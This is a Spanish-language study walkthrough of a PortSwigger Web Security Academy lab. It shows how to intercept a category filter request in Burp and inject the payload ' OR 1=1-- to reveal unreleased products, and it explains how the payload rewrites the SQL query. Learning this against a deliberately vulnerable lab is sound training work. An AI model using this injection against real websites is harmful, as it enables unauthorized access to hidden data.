# Lab — SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

> Fuente principal: solución oficial de PortSwigger Web Security Academy.

## Objetivo exacto

Conseguir que la tienda muestre **uno o más productos no publicados** explotando SQL injection en el filtro de categorías.

---

# Qué enseña este lab

La aplicación construye una consulta parecida a:

```sql
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1;
```

El parámetro controlable es:

```text
category
```

La vulnerabilidad aparece porque su valor se concatena dentro de SQL.

---

# Procedimiento oficial paso a paso

## Paso 1 — Abrir una categoría

En la tienda, hacer clic en cualquier categoría de productos.

Esto genera una request parecida a:

```http
GET /filter?category=Gifts HTTP/2
```

---

## Paso 2 — Interceptar la request

En Burp:

```text
Proxy
→ Intercept
→ Intercept is ON
```

Volver a seleccionar una categoría para capturar la petición.

---

## Paso 3 — Localizar `category`

Encontrar en la primera línea algo parecido a:

```http
GET /filter?category=Gifts HTTP/2
```

El valor que modificaremos es:

```text
Gifts
```

---

## Paso 4 — Sustituirlo por el payload oficial

Cambiar el valor del parámetro a:

```text
'+OR+1=1--
```

La request quedará conceptualmente:

```http
GET /filter?category='+OR+1=1-- HTTP/2
```

Semánticamente, el input representa:

```text
' OR 1=1--
```

---

## Paso 5 — Forward

Pulsar:

```text
Forward
```

La página debería mostrar productos adicionales, incluyendo uno o más productos que normalmente no estaban publicados.

Cuando aparezcan productos no publicados, el lab se resuelve.

---

# Qué ocurre dentro de SQL

Consulta original conceptual:

```sql
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1;
```

Con el payload:

```text
' OR 1=1--
```

queda conceptualmente:

```sql
SELECT * FROM products
WHERE category = '' OR 1=1--'
AND released = 1;
```

`1=1` siempre es verdadero.

`--` comenta lo que queda después.

Por tanto, la restricción:

```sql
released = 1
```

deja de aplicarse efectivamente.

---

# Por qué aparecen `+`

La solución oficial muestra:

```text
'+OR+1=1--
```

Los `+` representan espacios dentro de la petición HTTP.

Lo importante a nivel SQL es entender:

```text
' OR 1=1--
```

---

# Burp que tengo que aprender

- `Proxy → Intercept`;
- reconocer una request GET con query string;
- identificar `category=`;
- modificar únicamente el valor del parámetro;
- usar `Forward`;
- observar cómo cambia el contenido de la respuesta/página.

---

# Práctica complementaria con Repeater

> Opcional. No sustituye el workflow oficial.

Después de resolver el lab, se puede localizar la request en:

```text
Proxy → HTTP history
```

hacer:

```text
Send to Repeater
```

y comparar:

```text
category=Gifts
```

contra:

```text
category='+OR+1=1--
```

Esto ayuda a ver con calma la diferencia entre ambas Responses.

---

# Errores frecuentes

## Modificar otro parámetro

El parámetro vulnerable de este lab es:

```text
category
```

## Confundir `+` con SQL

`+` aquí representa espacios en la petición. La lógica SQL que interesa es:

```text
' OR 1=1--
```

## Olvidar el comentario

Sin `--`, el resto de la consulta original puede provocar un error o seguir imponiendo condiciones no deseadas.

---

# Checklist

- [ ] Seleccioné una categoría.
- [ ] Intercepté la request del filtro.
- [ ] Identifiqué `category=`.
- [ ] Usé `'+OR+1=1--`.
- [ ] Hice Forward.
- [ ] Vi productos no publicados.
- [ ] Entiendo qué hacen `'`, `OR 1=1` y `--`.

---

# Regla para recordar

```text
'          → cierro la cadena
OR 1=1     → hago verdadera la condición
--         → anulo el resto de la consulta
```
